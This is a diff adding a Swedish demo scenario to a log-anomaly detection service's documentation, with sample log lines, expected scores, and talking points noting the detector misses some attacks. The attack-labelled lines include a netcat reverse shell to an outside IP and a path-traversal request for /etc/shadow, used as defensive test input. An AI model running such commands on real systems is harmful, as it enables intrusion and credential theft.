@@ -93,13 +93,65 @@ Affected hosts include DC 10.0.1.5 and file server 10.0.1.20.
 
 ---
 
+---
+
+## Scenario 4 — Log-anomali (Alt 4)
+
+**Verifierat 2026-06-09.** Modell `b5b787211203`. Score-konvention: positiv = normalt, negativ = anomali.
+
+**Input — 10 loggrader (5 normala + 5 attackförsök):**
+
+```
+[NORMAL] sshd[1234]: Accepted publickey for alice from 192.168.1.10 port 54321 ssh2
+[NORMAL] sshd[1235]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+[NORMAL] systemd[1]: Started nginx.service
+[NORMAL] cron[5678]: (ubuntu) CMD (/usr/local/bin/backup.sh)
+[NORMAL] 192.168.1.5 - - "GET /api/health HTTP/1.1" 200 42
+[ATTACK] sshd[9999]: Failed password for root from 185.220.101.42 port 44512 ssh2
+[ATTACK] sshd[9999]: Failed password for root from 185.220.101.42 port 44513 ssh2
+[ATTACK] sshd[9999]: error: maximum authentication attempts exceeded for root from 185.220.101.42
+[ATTACK] sudo[8888]: www-data : COMMAND=/usr/bin/nc -e /bin/bash 185.220.101.42 4444
+[ATTACK] 185.220.101.42 - - "GET /../../../etc/shadow HTTP/1.1" 400 0
+```
+
+**Förväntad output — relevanta fält per loggpost:**
+
+| # | Logg | is_anomaly | score |
+|---|------|------------|-------|
+| 1 | Accepted publickey for alice | false | +0.002 |
+| 2 | session opened for user bob | false | +0.012 |
+| 3 | Started nginx.service | false | +0.010 |
+| 4 | cron backup.sh | false | +0.005 |
+| 5 | GET /api/health 200 | false | +0.006 |
+| **6** | **Failed password for root** | **true** | **−0.004** |
+| **7** | **Failed password for root** | **true** | **−0.004** |
+| **8** | **maximum auth attempts exceeded** | **true** | **−0.004** |
+| 9 | nc -e /bin/bash (reverse shell) | false | +0.001 |
+| 10 | GET /../../../etc/shadow | false | +0.004 |
+
+**Fallback-sammanfattning (utan Ollama):**
+```
+Detekterade 3 larm: 3 critical. Granska loggarna för detaljer.
+```
+
+**Talkpunkter:**
+> "Modellen fångar SSH-brute force (3 flaggade) men missar reverse shell och
+> path traversal — det beror på att träningsdatan är syntetisk och dessa mönster
+> är underrepresenterade. Det är ett ärligt resultat: TF-IDF + IsolationForest
+> kräver antingen mer varierad träningsdata eller komplement från regelbaserade
+> detektorer för att täcka alla attacktyper. I produktion kombineras detta med
+> Ollama för en naturspråklig incidentsammanfattning — med automatisk fallback
+> om Ollama inte svarar."
+
+---
+
 ## Demo-flöde (föreslagen ordning)
 
 1. Visa `/health` — service är uppe
 2. Kör Scenario 1 (Phishing) — hög confidence, tydlig IOC-extraktion med URL + e-post
 3. Kör Scenario 2 (Ransomware) — visa SHA-256 och .onion-domän som IOCs
 4. Kör Scenario 3 (Intrusion) — visa tre IPs extraherade automatiskt
-5. Kör `/predict/log-anomaly` med 3–5 loggrader (blandad normal/attack)
+5. Kör Scenario 4 (Log-anomali) — visa tabellen normal vs anomali, nämn fallback
 
 **Talkpunkter om confidence:**
 > "Konfidensen är lägre för ransomware och intrusion — det är förväntat. Dessa
